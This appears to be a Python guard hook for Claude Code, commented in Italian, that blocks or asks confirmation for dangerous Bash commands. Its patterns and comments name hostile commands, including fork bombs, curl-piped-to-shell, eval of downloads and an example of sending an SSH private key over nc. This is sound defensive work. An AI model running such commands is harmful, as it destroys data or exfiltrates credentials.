#!/usr/bin/env python3
"""PreToolUse(Bash) hook: blocca o gate shell command pericolosi.

I deny in settings.json coprono i casi a stringa esatta (`rm -rf /`, force-push).
Questo hook copre cio' che il match di stringa non gestisce:

BLOCCO DURO (exit 2, stderr -> modello):
- fork bomb, raw write su disco (`> /dev/...`, `dd of=/dev/...`, `mkfs.*`)
- chmod/chown ricorsivo su root
- esecuzione di script remoto scaricato al volo: `curl ... | bash`, ma anche
  `bash <(curl ...)`, `eval "$(curl ...)"`, `curl ... | python`
- `bw export` (dump dell'intera vault Bitwarden in chiaro)

CHIEDE CONFERMA (permissionDecision:"ask", exit 0):
- `rm -r` che risolve su un tree protetto (~/.claude, memoria, progetti, cwd)
- scrittura shell su ~/.claude/settings* o hooks/** (auto-modifica delle guardie),
  incluso il caso `cd ~/.claude/hooks && > file` (target relativo dopo un cd)
- creazione di un file di unlock (*-unlock-*) che sbloccherebbe l'auto-modifica
- lettura di file segreti via shell (cat/head/xxd/base64/perl/ruby/nc/redirezione
  `< file`... su chiavi private, ~/.ssh, ~/.aws/credentials, .gnupg, *.pem...)
- docker distruttivo su volumi (`docker volume rm`, `system prune --volumes`)

Fail-open su parsing (i casi catastrofici su path root restano nei deny).
"""
import json
import re
import sys
import os
import signal
import shlex


def _stdin_timeout(signum, frame):
    sys.exit(0)


if hasattr(signal, "SIGALRM"):
    signal.signal(signal.SIGALRM, _stdin_timeout)


# --- Blocco duro (exit 2) ---
DANGEROUS = [
    (r":\(\)\s*\{[^}]*\}\s*;\s*:", "fork bomb"),
    (r"\bmkfs\.[a-z0-9]+", "format filesystem"),
    (r"\bdd\s+[^|]*\bof=/dev/(sd[a-z]|nvme|disk)", "scrittura raw su block device"),
    (r">\s*/dev/(sd[a-z]|nvme|disk|hd[a-z])", "redirezione raw su disco"),
    (r"\bchmod\s+-R\s+0*777\s+/(\s|$)", "permessi world-writable su root"),
    (r"\bchown\s+-R\s+\S+\s+/(\s|$)", "cambio ownership ricorsivo su root"),
    # curl|bash e le sue varianti che eseguono uno script remoto scaricato al volo:
    (r"\b(curl|wget|fetch)\b[^|]*\|\s*(sudo\s+)?(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b",
     "pipe di script remoto in un interprete"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node|php)\b\s+<\(\s*(curl|wget|fetch)\b",
     "esecuzione via process-substitution di script remoto"),
    (r"\beval\b[^\n]*\$\(\s*(curl|wget|fetch)\b",
     "eval di output di download remoto"),
    (r"\b(bash|sh|zsh|fish|python3?|perl|ruby|node)\b\s+-c\s+[\"']?\$\(\s*(curl|wget|fetch)\b",
     "interprete -c su output di download remoto"),
    (r"\bsudo\s+rm\s+-rf?\s+(/|~|\$HOME|\*)", "rm ricorsivo con sudo su root/home/wildcard"),
    (r"\bbw\s+export\b", "export dell'intera vault Bitwarden in chiaro"),
]

# --- Scrittura su config/hook di Claude Code -> ask ---
# Path config/hook considerati sensibili (settings*.json, hooks/**, .claude.json).
_CFG_SUFFIX_RE = re.compile(
    r"\.claude/(?:settings[^/]*\.json|hooks/|hooks$|\.claude\.json)",
    re.IGNORECASE,
)
# Operatori di scrittura shell. Il match testuale del path assoluto e' il caso base;
# _writes_config() sotto copre anche il target RELATIVO dopo un `cd ~/.claude/...`.
_CFG_ABS = r"[^\s'\";|&]*\.claude/(?:settings[^/\s'\"]*\.json|hooks/|\.claude\.json)"
CONFIG_WRITE_RE = re.compile(
    r"(?:>>?\s*" + _CFG_ABS +
    r"|\b(?:tee|cp|mv|install|rsync|ln|dd|truncate|touch|chmod|chown)\b[^|;&]*" + _CFG_ABS +
    r"|\bsed\b[^|;&]*-i[^|;&]*" + _CFG_ABS +
    r"|open\(\s*['\"][^'\"]*\.claude/(?:settings|hooks/|\.claude\.json)[^'\"]*['\"]\s*,\s*['\"][wa])",
    re.IGNORECASE,
)
# Binari che scrivono un file passato come argomento.
_WRITE_BINS = frozenset("tee cp mv install rsync ln dd truncate touch".split())

# --- File di unlock che sbloccherebbero l'auto-modifica di config/hook -> ask ---
UNLOCK_RE = re.compile(r"\.claude/[^\s'\";|&]*unlock[^\s'\";|&]*", re.IGNORECASE)

# --- Lettura di file segreti via shell -> ask (vedi _reads_secret sotto) ---
SECRET_PATH_RE = re.compile(
    r"(\.ssh/|(^|/)id_(rsa|ed25519|ecdsa|dsa)\b|\.aws/credentials|\.gnupg/|"
    r"\.git-credentials|\.pem\b|service-account[^\s'\"]*\.json|credentials\.json|"
    r"\.pypirc|secrets\.env|\.secrets/|\.config/gh/hosts\.yml|\.npmrc|"
    r"\.docker/config\.json|\.kube/config)",
    re.IGNORECASE,
)

# Check segreti PER-SEGMENTO. Chiede se un path segreto compare come ARGOMENTO
# (non come identita' ssh) in un segmento il cui comando e' un binario di lettura
# o di trasporto, oppure se il segmento reindirizza un segreto in ingresso
# (`< chiave`, `$(< chiave)`). Ampliato per coprire perl/ruby/nc/socat/tac/rev/
# mapfile e la redirezione, che prima sfuggivano (chiave privata leggibile/inviata
# senza ask). Lo scarto di `-i <key>` / `IdentityFile=` evita i falsi positivi su
# ssh/scp -i <chiave> (identita', non lettura).
_READ_BINS = frozenset(
    "cat head tail less more bat xxd od strings base64 nl cut awk sed "
    "cp scp rsync dd open grep perl ruby python python3 tac rev mapfile "
    "nc ncat socat gpg tar zip".split()
)
_ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")
_SKIP_WRAPPERS = frozenset(("sudo", "command", "nohup", "caffeinate", "timeout", "env"))
# `< file` o `$(< file)` con file segreto: esfiltrazione via redirezione (es.
# `nc host 443 < ~/.ssh/id_ed25519`, `echo "$(<~/.ssh/id_ed25519)"`).
_SECRET_REDIR_RE = re.compile(
    r"(?:<\s*|\$\(\s*<\s*)[^\s'\";|&)]*"
    r"(\.ssh/|id_(rsa|ed25519|ecdsa|dsa)|\.aws/credentials|\.gnupg/|"
    r"\.git-credentials|\.pem|credentials\.json|\.pypirc|secrets\.env|\.secrets/)",
    re.IGNORECASE,
)


def _cmd_subst_bodies(command: str):
    """Corpi delle command-substitution `$(...)` e backtick: bash li ESEGUE anche
    dentro le doppie virgolette, quindi `git commit -m "$(cat chiave)"` legge davvero
    la chiave. Vanno analizzati come comandi a se'."""
    bodies = re.findall(r"\$\(([^()]*)\)", command)
    bodies += re.findall(r"`([^`]*)`", command)
    return bodies


def _reads_secret(command: str) -> bool:
    cmd = command.replace("\\\n", " ")
    for src in [cmd] + _cmd_subst_bodies(cmd):
        if _reads_secret_flat(src):
            return True
    return False


def _reads_secret_flat(cmd: str) -> bool:
    if _SECRET_REDIR_RE.search(cmd):
        return True
    for seg in re.split(r"[|;&\n]+", cmd):
        toks = seg.split()
        i = 0
        while i < len(toks) and (
            _ENV_ASSIGN_RE.match(toks[i]) or toks[i] in _SKIP_WRAPPERS
        ):
            i += 1
        if i >= len(toks):
            continue
        if os.path.basename(toks[i]) not in _READ_BINS:
            continue
        args, j = [], i + 1
        while j < len(toks):
            t = toks[j]
            if t == "-i" and j + 1 < len(toks):
                j += 2  # identita' ssh/scp/rsync (o suffix sed -i: mai un segreto)
                continue
            if t.startswith("-oIdentityFile=") or t.startswith("IdentityFile="):
                j += 1
                continue
            args.append(t)
            j += 1
        if any(SECRET_PATH_RE.search(a) for a in args):
            return True
    return False

# --- Docker distruttivo su volumi -> ask ---
DOCKER_DESTRUCTIVE_RE = re.compile(
    r"\bdocker\s+volume\s+rm\b|\bdocker\s+system\s+prune\b[^|]*--volumes",
    re.IGNORECASE,
)

BARE_TARGETS = {".", "./", "*", ".*", "*.*", "./*", ".//"}


def _home():
    return os.path.expanduser("~")


def _projects_base():
    raw = os.environ.get("PROJECTS_BASE", "").strip()
    if raw:
        raw = raw.replace("${HOME}", _home()).replace("$HOME", _home())
        return os.path.normpath(os.path.expanduser(raw))
    return os.path.normpath(os.path.join(_home(), "Documents", "ClaudeCode"))


def _ask(reason):
    print(json.dumps({
        "hookSpecificOutput": {
            "hookEventName": "PreToolUse",
            "permissionDecision": "ask",
            "permissionDecisionReason": reason,
        }
    }))
    return 0


def _resolve(target, cwd):
    t = (target or "").strip().strip('"').strip("'")
    if not t:
        return None
    t = t.replace("${HOME}", _home()).replace("$HOME", _home())
    t = os.path.expanduser(t)
    if not os.path.isabs(t):
        t = os.path.join(cwd or _home(), t)
    return os.path.normpath(t)


def _is_protected_tree(p):
    if not p:
        return False
    h = _home()
    claude = os.path.normpath(os.path.join(h, ".claude"))
    base = _projects_base()
    if p == claude or p.startswith(claude + os.sep):
        return True
    if p == base:
        return True
    if os.path.dirname(p) == base:
        return True
    if p == h or p == os.path.normpath("/"):
        return True
    return False


def _under_claude_config(p):
    """True se il path reale cade su ~/.claude/settings*, ~/.claude/hooks/** o .claude.json."""
    if not p:
        return False
    h = _home()
    hooks = os.path.normpath(os.path.join(h, ".claude", "hooks"))
    if p == hooks or p.startswith(hooks + os.sep):
        return True
    base = os.path.basename(p)
    if os.path.dirname(p) == os.path.normpath(os.path.join(h, ".claude")):
        if base == ".claude.json" or (base.startswith("settings") and base.endswith(".json")):
            return True
    return False


def _writes_config(command, cwd):
    """Copre `cd ~/.claude/hooks && > file` (target relativo dopo un cd): il match
    testuale di CONFIG_WRITE_RE vede solo i path assoluti che contengono `.claude/`.
    Qui si traccia il cd per segmento e si risolve il target reale del redirect/binario."""
    cwd_decl = None
    for seg in re.split(r"&&|\|\||;|\||\n", command):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except Exception:
            toks = seg.split()
        if not toks:
            continue
        if toks[0] == "cd" and len(toks) >= 2:
            cwd_decl = _resolve(toks[1], cwd_decl or cwd)
            continue
        base_cwd = cwd_decl or cwd
        # redirect > / >> verso un target
        m = re.search(r">>?\s*([^\s'\";|&]+)", seg)
        if m and _under_claude_config(_resolve(m.group(1), base_cwd)):
            return True
        # binario di scrittura con un target come argomento
        cmd0 = os.path.basename(toks[0])
        if cmd0 in _WRITE_BINS:
            for t in toks[1:]:
                if t.startswith("-"):
                    continue
                if _under_claude_config(_resolve(t, base_cwd)):
                    return True
        # sed -i sul file
        if cmd0 == "sed" and "-i" in seg:
            for t in toks[1:]:
                if not t.startswith("-") and _under_claude_config(_resolve(t, base_cwd)):
                    return True
    return False


def _rm_segments(command):
    out = []
    cwd_decl = None
    # Newline separa comandi come ; : senza, `git commit\nrm -rf x` nasconderebbe
    # l'rm in un segmento che inizia con "git" e sfuggirebbe al rilevamento.
    for seg in re.split(r"&&|\|\||;|\||\n", command):
        seg = seg.strip()
        if not seg:
            continue
        try:
            toks = shlex.split(seg)
        except Exception:
            toks = seg.split()
        if not toks:
            continue
        if toks[0] == "cd" and len(toks) >= 2:
            cwd_decl = toks[1]
            continue
        if toks[0] == "rm":
            recursive = False
            targets = []
            for tk in toks[1:]:
                if tk == "--recursive":
                    recursive = True
                elif tk.startswith("-") and tk != "--":
                    if "r" in tk.lower():
                        recursive = True
                elif tk != "--":
                    targets.append(tk)
            if recursive:
                out.append((targets, cwd_decl))
    return out


def main() -> int:
    try:
        if hasattr(signal, "SIGALRM"):
            signal.alarm(8)
        data = json.load(sys.stdin)
        if hasattr(signal, "SIGALRM"):
            signal.alarm(0)
    except Exception:
        return 0

    if data.get("tool_name") != "Bash":
        return 0
    command = (data.get("tool_input") or {}).get("command", "")
    if not isinstance(command, str) or not command:
        return 0
    cwd = data.get("cwd") or _home()

    # 1) Blocco duro
    for pattern, why in DANGEROUS:
        if re.search(pattern, command, re.IGNORECASE):
            sys.stderr.write(
                f"Bloccato: questo comando sembra {why}. "
                "Se e' intenzionale, eseguilo manualmente in un terminale. "
                "L'assistente non esegue operazioni distruttive irreversibili.\n"
            )
            return 2

    # 2) Scrittura shell su config/hook di Claude Code -> ask (auto-modifica guardie)
    if CONFIG_WRITE_RE.search(command) or _writes_config(command, cwd):
        return _ask(
            "Scrittura via shell su settings/hook di Claude Code: modificherebbe "
            "le guardie stesse. Conferma solo se stai aggiornando la config di proposito."
        )

    # 2b) Creazione di un file di unlock -> ask (sbloccherebbe l'auto-modifica)
    if UNLOCK_RE.search(command):
        return _ask(
            "Creazione di un file di unlock che disattiverebbe la protezione "
            "sull'auto-modifica di config/hook. Conferma solo se sei tu a volerlo."
        )

    # 3) Lettura di file segreti via shell -> ask (per-segmento, alta precisione)
    if _reads_secret(command):
        return _ask(
            "Lettura di un file segreto via shell (chiave privata, credenziali, "
            "~/.ssh, ~/.aws...). Conferma solo se serve davvero: il contenuto "
            "finirebbe nel contesto e potrebbe essere esfiltrato."
        )

    # 4) Docker distruttivo su volumi -> ask
    if DOCKER_DESTRUCTIVE_RE.search(command):
        return _ask(
            "Rimozione di volumi Docker (dati persistenti). Irreversibile: "
            "conferma solo se vuoi davvero cancellare i dati dei container."
        )

    # 5) rm ricorsivo su tree protetti -> ask
    try:
        for targets, cwd_decl in _rm_segments(command):
            base_cwd = _resolve(cwd_decl, cwd) if cwd_decl else os.path.normpath(cwd)
            for t in (targets or ["."]):
                if t in BARE_TARGETS:
                    p = os.path.normpath(base_cwd)
                else:
                    p = _resolve(t, base_cwd)
                if _is_protected_tree(p):
                    return _ask(
                        f"rm ricorsivo su un percorso protetto ({p}): memoria, "
                        "progetti o config di Claude Code. Irreversibile (niente "
                        "cestino su macOS). Conferma solo se vuoi davvero cancellarlo."
                    )
    except Exception:
        pass

    return 0


if __name__ == "__main__":
    sys.exit(main())
